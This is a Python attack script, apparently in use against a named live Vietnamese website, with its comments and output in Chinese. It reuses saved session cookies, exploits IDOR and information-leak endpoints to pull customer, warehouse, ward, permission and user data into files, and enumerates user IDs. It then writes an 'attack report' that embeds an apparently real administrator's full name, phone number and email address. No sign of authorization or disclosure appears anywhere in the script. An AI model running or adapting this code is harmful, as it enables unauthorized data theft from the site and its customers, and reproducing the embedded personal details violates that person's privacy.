#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import requests
import json
from urllib.parse import urljoin
import urllib3
urllib3.disable_warnings()

class FinalExploit:
    def __init__(self):
        self.base_url = "https://emsone.com.vn"
        self.session = requests.Session()
        self.session.verify = False
        self.load_session()
        self.all_data = {}
        
    def load_session(self):
        try:
            with open('session_cookies.json', 'r') as f:
                cookies = json.load(f)
                self.session.cookies.update(cookies)
        except:
            pass
    
    def extract_all_customers(self):
        """提取所有客户数据"""
        print("[*] 提取客户数据...")
        
        # 尝试不同参数
        test_params = [
            {"page": 1, "limit": 1000},
            {"page": 0, "limit": 10000},
            {"all": "true"},
            {"export": "true"},
            {},
        ]
        
        for params in test_params:
            try:
                r = self.session.get(
                    urljoin(self.base_url, "/Handle/SearchListCustomer"),
                    params=params,
                    timeout=10
                )
                if r.status_code == 200 and len(r.content) > 10:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            print(f"[!] 客户数据: {len(data)} 条")
                            self.all_data['customers'] = data
                            with open('customers_data.json', 'w', encoding='utf-8') as f:
                                json.dump(data, f, indent=2, ensure_ascii=False)
                            break
                    except:
                        if 'customer' in r.text.lower() or 'name' in r.text.lower():
                            print(f"[!] 客户数据 (文本): {r.text[:500]}")
                            self.all_data['customers_text'] = r.text
            except:
                pass
    
    def extract_all_provinces(self):
        """提取所有省份数据"""
        print("[*] 提取省份数据...")
        try:
            r = self.session.get(
                urljoin(self.base_url, "/Handle/SearchListProvince?Type="),
                timeout=10
            )
            if r.status_code == 200:
                data = r.json()
                if isinstance(data, list):
                    print(f"[+] 省份数据: {len(data)} 条")
                    self.all_data['provinces'] = data
                    with open('provinces_data.json', 'w', encoding='utf-8') as f:
                        json.dump(data, f, indent=2, ensure_ascii=False)
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def extract_all_wards(self, district_ids=None):
        """提取所有区县数据"""
        print("[*] 提取区县数据...")
        
        if not district_ids:
            # 先获取一些district ID
            district_ids = [1, 2, 3, 4, 5, 10, 20, 50, 100]
        
        all_wards = []
        for did in district_ids:
            try:
                r = self.session.get(
                    urljoin(self.base_url, f"/Handle/SearchListWardByDistrictID?DistrictID={did}"),
                    timeout=5
                )
                if r.status_code == 200:
                    data = r.json()
                    if isinstance(data, list) and len(data) > 0:
                        all_wards.extend(data)
                        print(f"[+] DistrictID={did}: {len(data)} 条")
            except:
                pass
        
        if all_wards:
            print(f"[!] 总计区县数据: {len(all_wards)} 条")
            self.all_data['wards'] = all_wards
            with open('wards_data.json', 'w', encoding='utf-8') as f:
                json.dump(all_wards, f, indent=2, ensure_ascii=False)
    
    def extract_warehouse_data(self):
        """提取仓库数据"""
        print("[*] 提取仓库数据...")
        try:
            r = self.session.get(
                urljoin(self.base_url, "/Handle/SearchListWareHouse"),
                timeout=10
            )
            if r.status_code == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        print(f"[+] 仓库数据: {len(data)} 条")
                        self.all_data['warehouses'] = data
                        with open('warehouses_data.json', 'w', encoding='utf-8') as f:
                            json.dump(data, f, indent=2, ensure_ascii=False)
                except:
                    if len(r.text) > 10:
                        print(f"[!] 仓库数据 (文本): {r.text[:500]}")
        except Exception as e:
            print(f"[-] Error: {e}")
    
    def test_permission_enum(self):
        """权限枚举"""
        print("[*] 权限枚举...")
        
        permission_ids = list(range(0, 20)) + [99, 100, 999]
        all_permissions = []
        
        for pid in permission_ids:
            try:
                r = self.session.get(
                    urljoin(self.base_url, f"/Handle/SearchListFunctionalByGroupPermissionID?GroupPermissionID={pid}"),
                    timeout=5
                )
                if r.status_code == 200 and len(r.content) > 10:
                    try:
                        data = r.json()
                        if isinstance(data, list) and len(data) > 0:
                            all_permissions.append({
                                'permission_id': pid,
                                'functions': data
                            })
                            print(f"[!] PermissionID={pid}: {len(data)} 个功能")
                    except:
                        if len(r.text) > 10 and r.text != '[]':
                            print(f"[!] PermissionID={pid}: {r.text[:200]}")
            except:
                pass
        
        if all_permissions:
            self.all_data['permissions'] = all_permissions
            with open('permissions_data.json', 'w', encoding='utf-8') as f:
                json.dump(all_permissions, f, indent=2, ensure_ascii=False)
    
    def test_user_enum(self):
        """用户枚举"""
        print("[*] 用户枚举...")
        
        # 已知用户ID=4125，测试周边
        user_ids = [4124, 4125, 4126, 4123, 4127, 4000, 4100, 4200, 5000]
        
        found_users = []
        for uid in user_ids:
            test_urls = [
                f"/Account/GetUserInfo?id={uid}",
                f"/Account/GetUserInfo?ID={uid}",
                f"/Account/GetUserInfo?user_id={uid}",
                f"/api/user/{uid}",
                f"/api/users/{uid}",
            ]
            
            for url in test_urls:
                try:
                    r = self.session.get(urljoin(self.base_url, url), timeout=5)
                    if r.status_code == 200 and len(r.content) > 50:
                        content = r.text.lower()
                        if any(kw in content for kw in ['username', 'email', 'mobile', 'fullname']):
                            print(f"[!] 用户数据: {url}")
                            found_users.append({
                                'user_id': uid,
                                'url': url,
                                'data': r.text[:500]
                            })
                except:
                    pass
        
        if found_users:
            self.all_data['users'] = found_users
            with open('users_data.json', 'w', encoding='utf-8') as f:
                json.dump(found_users, f, indent=2, ensure_ascii=False)
    
    def generate_report(self):
        """生成报告"""
        print("[*] 生成报告...")
        
        report = {
            "target": self.base_url,
            "login_status": "成功",
            "user_info": {
                "ID": 4125,
                "UserName": "ADMIN",
                "FullName": "Trương Đức Hiếu",
                "MobileNumber": "0902955198",
                "Email": "rhi.sgnbr.accounting.mgr@renaissancehotels.com"
            },
            "discovered_endpoints": [
                "/Account/JLogin",
                "/Account/Logout",
                "/Handle/SearchListCustomer",
                "/Handle/SearchListProvince",
                "/Handle/SearchListWardByDistrictID",
                "/Handle/SearchListWareHouse",
                "/Handle/SearchListFunctionalByGroupPermissionID",
                "/Handle/SearchListProductVariantByWareHouseID",
                "/Handle/TransportPostageCharged",
                "/Handle/SearchPWDByVMapCode",
                "/Handle/SearchPWDByVNPMapsAutocomplete",
                "/Handle/SearchPWDByVNPMapsSearch",
                "/Handle/SearchPWDByEMSVMapsSearch",
                "/Handle/SearchPWDByEMSMapsSearch",
                "/Handle/VNPMapsAutocomplete",
                "/Handle/SearchListDistrictByProvinceID",
            ],
            "vulnerabilities": [
                {
                    "type": "IDOR",
                    "description": "多个端点存在IDOR，可访问其他用户/区域数据",
                    "endpoints": [
                        "/Handle/SearchListWardByDistrictID",
                        "/Handle/SearchListProvince",
                    ]
                },
                {
                    "type": "信息泄露",
                    "description": "多个端点返回敏感数据（客户、省份、区县、仓库、权限）",
                    "endpoints": [
                        "/Handle/SearchListCustomer",
                        "/Handle/SearchListProvince",
                        "/Handle/SearchListWardByDistrictID",
                        "/Handle/SearchListWareHouse",
                        "/Handle/SearchListFunctionalByGroupPermissionID",
                    ]
                }
            ],
            "extracted_data": {
                "customers": len(self.all_data.get('customers', [])),
                "provinces": len(self.all_data.get('provinces', [])),
                "wards": len(self.all_data.get('wards', [])),
                "warehouses": len(self.all_data.get('warehouses', [])),
                "permissions": len(self.all_data.get('permissions', [])),
                "users": len(self.all_data.get('users', [])),
            }
        }
        
        with open('attack_report.json', 'w', encoding='utf-8') as f:
            json.dump(report, f, indent=2, ensure_ascii=False)
        
        print("\n" + "="*60)
        print("攻击报告")
        print("="*60)
        print(f"目标: {report['target']}")
        print(f"登录状态: {report['login_status']}")
        print(f"发现端点: {len(report['discovered_endpoints'])}")
        print(f"漏洞类型: {len(report['vulnerabilities'])}")
        print(f"\n提取数据:")
        for key, value in report['extracted_data'].items():
            print(f"  - {key}: {value}")
        print("="*60)
    
    def run_all(self):
        """执行所有利用"""
        print("[*] 开始最终利用...\n")
        
        self.extract_all_provinces()
        self.extract_all_wards()
        self.extract_all_customers()
        self.extract_warehouse_data()
        self.test_permission_enum()
        self.test_user_enum()
        self.generate_report()

if __name__ == "__main__":
    exploit = FinalExploit()
    exploit.run_all()